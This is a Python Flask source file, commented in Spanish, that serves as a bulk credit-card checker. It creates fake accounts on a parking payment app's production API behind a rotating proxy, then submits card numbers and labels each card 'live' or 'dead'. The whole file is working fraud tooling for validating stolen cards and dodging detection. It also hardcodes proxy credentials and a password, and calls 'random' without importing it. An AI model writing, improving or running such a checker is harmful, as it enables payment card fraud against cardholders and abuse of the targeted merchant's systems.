import json
import time
import os
import requests
from faker import Faker
from flask import Flask, request, jsonify

fake = Faker()

app = Flask(__name__)

# ---------------------------
# PROXY CONFIG
# ---------------------------

PROXY_HOST = "p.webshare.io:80"
PROXY_USER = "izvhxurt-rotate"
PROXY_PASS = "acx0bzc9xbkg"

PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}"

c = requests.Session()
proxies = {"http": PROXY_URL, "https": PROXY_URL}
c.proxies.update(proxies)

REGISTER_URL = "https://parkingpay-api-prod.azurewebsites.net/api/app/usuarios/registro"
LOGIN_URL = "https://parkingpay-api-prod.azurewebsites.net/api/auth"
CARD_URL = "https://parkingpay-api-prod.azurewebsites.net/api/app/conductor/tarjetas"

PASSWORD = "Tumama19012!"


# ===========================
# DIAGNÓSTICO PROXY
# ===========================

@app.route('/diagnostico')
def diagnostico():
    """
    Verifica si el proxy está funcionando comparando IP con y sin proxy
    """
    result = {
        "proxy_config": {
            "host": PROXY_HOST,
            "user": PROXY_USER,
            "url_masked": f"http://{PROXY_USER}:****@{PROXY_HOST}"
        },
        "session_proxies": dict(c.proxies),
        "tests": {}
    }

    # Test 1: IP sin proxy (requests directo)
    try:
        r_no_proxy = requests.get("https://httpbin.org/ip", timeout=10)
        result["tests"]["sin_proxy"] = {
            "status": "ok",
            "ip": r_no_proxy.json().get("origin", "unknown")
        }
    except Exception as e:
        result["tests"]["sin_proxy"] = {
            "status": "error",
            "error": str(e)
        }

    # Test 2: IP con proxy (sesión c)
    try:
        r_con_proxy = c.get("https://httpbin.org/ip", timeout=10)
        result["tests"]["con_proxy"] = {
            "status": "ok",
            "ip": r_con_proxy.json().get("origin", "unknown"),
            "status_code": r_con_proxy.status_code
        }
    except Exception as e:
        result["tests"]["con_proxy"] = {
            "status": "error",
            "error": str(e)
        }

    # Test 3: IP con proxy explícito en requests.get
    try:
        r_explicit = requests.get(
            "https://httpbin.org/ip",
            proxies=proxies,
            timeout=10
        )
        result["tests"]["proxy_explicito"] = {
            "status": "ok",
            "ip": r_explicit.json().get("origin", "unknown")
        }
    except Exception as e:
        result["tests"]["proxy_explicito"] = {
            "status": "error",
            "error": str(e)
        }

    # Comparación
    sin_proxy_ip = result["tests"].get("sin_proxy", {}).get("ip", "")
    con_proxy_ip = result["tests"].get("con_proxy", {}).get("ip", "")

    result["proxy_funcionando"] = (
        sin_proxy_ip != "" and
        con_proxy_ip != "" and
        sin_proxy_ip != con_proxy_ip
    )

    result["conclusion"] = (
        "✅ Proxy FUNCIONA - IPs son diferentes"
        if result["proxy_funcionando"]
        else "❌ Proxy NO FUNCIONA - IPs son iguales o hay error"
    )

    return jsonify(result)


@app.route('/diagnostico/proxy-detalle')
def diagnostico_proxy_detalle():
    """
    Test más profundo del proxy con múltiples servicios
    """
    tests = {}

    # Test con httpbin.org
    try:
        r = c.get("https://httpbin.org/get", timeout=15)
        data = r.json()
        tests["httpbin_headers"] = {
            "status_code": r.status_code,
            "origin": data.get("origin"),
            "headers_sent": data.get("headers", {})
        }
    except Exception as e:
        tests["httpbin_headers"] = {"error": str(e)}

    # Test con ipinfo.io
    try:
        r = c.get("https://ipinfo.io/json", timeout=15)
        tests["ipinfo"] = {
            "status_code": r.status_code,
            "data": r.json() if r.status_code == 200 else r.text[:500]
        }
    except Exception as e:
        tests["ipinfo"] = {"error": str(e)}

    # Test proxy a ParkingPay (solo HEAD para ver si responde)
    try:
        r = c.head("https://parkingpay-api-prod.azurewebsites.net", timeout=10)
        tests["parkingpay_head"] = {
            "status_code": r.status_code,
            "headers": dict(r.headers)
        }
    except Exception as e:
        tests["parkingpay_head"] = {"error": str(e)}

    return jsonify({
        "proxy_url": f"http://{PROXY_USER}:****@{PROXY_HOST}",
        "session_proxies": dict(c.proxies),
        "tests": tests
    })


# ---------------------------
# REGISTRO
# ---------------------------
nombre = fake.first_name().lower()
apellido = fake.last_name().lower()
numero = random.randint(10, 99) # Número aleatorio de 2 dígitos


def registro_usuario():
    email = f"{nombre}.{apellido}{numero}@mailgrid.shop"
    #email = fake.email()
    payload = {
        "correoElectronico": email,
        "nombre": fake.first_name(),
        "apellidos": fake.last_name(),
        "telefono": ''.join(str(fake.random_digit_not_null()) for _ in range(10)),
        "contrasena": PASSWORD
    }
    headers = {
        "User-Agent": "Dart/3.8 (dart:io)",
        "Content-Type": "application/json; charset=utf-8"
    }
    r = c.post(REGISTER_URL, json=payload, headers=headers, timeout=20)
    return r, email


def registrar_usuario_hasta_exito(max_intentos=10, delay=2):
    for i in range(max_intentos):
        r, email = registro_usuario()
        if r and r.status_code in (200, 201):
            return email
        time.sleep(delay)
    return None


# ---------------------------
# LOGIN
# ---------------------------
def login_usuario(email):
    payload = {
        "correoElectronico": email,
        "contrasena": PASSWORD
    }
    headers = {
        "User-Agent": "Dart/3.8 (dart:io)",
        "Content-Type": "application/json; charset=utf-8"
    }
    r = c.post(LOGIN_URL, json=payload, headers=headers, timeout=20)
    if r.status_code in (200, 201):
        try:
            data = r.json()
            return data.get("token") or data.get("accessToken") or (data.get("data") or {}).get("token")
        except Exception:
            pass
    return None


# ---------------------------
# PROCESAR TARJETA
# ---------------------------
def procesar_tarjeta(card: str, route=None) -> dict:
    try:
        cc, mm, yy, cvv = card.split("|")
    except Exception:
        return {"status": "error", "message": "Formato inválido. Usa: cc|mm|yy|cvv", "card": card}

    email = registrar_usuario_hasta_exito()
    if not email:
        return {"status": "error", "message": "Registro fallido", "cc": card}

    token = login_usuario(email)
    if not token:
        return {"status": "error", "message": "Login fallido", "cc": card}

    payload = {
        "numero": cc,
        "expiracionMes": mm,
        "expiracionYear": yy
    }

    headers = {
        "authorization": token,
        "user-agent": "Dart/3.8 (dart:io)",
        "content-type": "application/json; charset=utf-8"
    }

    try:
        r = c.post(CARD_URL, json=payload, headers=headers, timeout=30)

        raw_response = {
            "status_code": r.status_code,
            "headers": dict(r.headers),
            "body": r.text,
            "url": r.url,
            "request_payload": payload,
            "request_headers": {k: v for k, v in headers.items() if k.lower() != "authorization"}
        }

        source = r.text.lower()

        if r.status_code == 200:
            return {
                "status": "live",
                "message": "Charged CCN $1.00 MX",
                "cc": card,
                "raw": raw_response
            }

        if r.status_code == 500 or "stripe" in source:
            return {
                "status": "dead",
                "message": "Your card was declined",
                "cc": card,
                "raw": raw_response
            }

        return {
            "status": "error",
            "message": f"Gateway error {r.status_code}",
            "cc": card,
            "raw": raw_response
        }

    except Exception as e:
        return {
            "status": "error",
            "message": str(e),
            "cc": card,
            "raw": {"exception": str(e)}
        }


# ===========================
# ENDPOINTS
# ===========================

@app.route('/')
def home():
    return jsonify({
        "status": "ok",
        "message": "API activa",
        "endpoints": {
            "GET /diagnostico": "Verificar si proxy funciona",
            "GET /diagnostico/proxy-detalle": "Diagnóstico profundo del proxy",
            "POST /check": "Verificar una tarjeta",
            "POST /check/bulk": "Verificar múltiples tarjetas"
        }
    })


@app.route('/check', methods=['POST'])
def check_card():
    data = request.get_json(silent=True) or {}
    card = data.get('card')
    if not card:
        return jsonify({"status": "error", "message": "Falta el campo 'card'"}), 400

    result = procesar_tarjeta(card)
    return jsonify(result)


@app.route('/check/bulk', methods=['POST'])
def check_bulk():
    data = request.get_json(silent=True) or {}
    cards = data.get('cards', [])
    if not cards or not isinstance(cards, list):
        return jsonify({"status": "error", "message": "Falta el campo 'cards' (array)"}), 400

    results = []
    for card in cards:
        result = procesar_tarjeta(card)
        results.append(result)
    return jsonify({"status": "ok", "total": len(cards), "results": results})


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
      
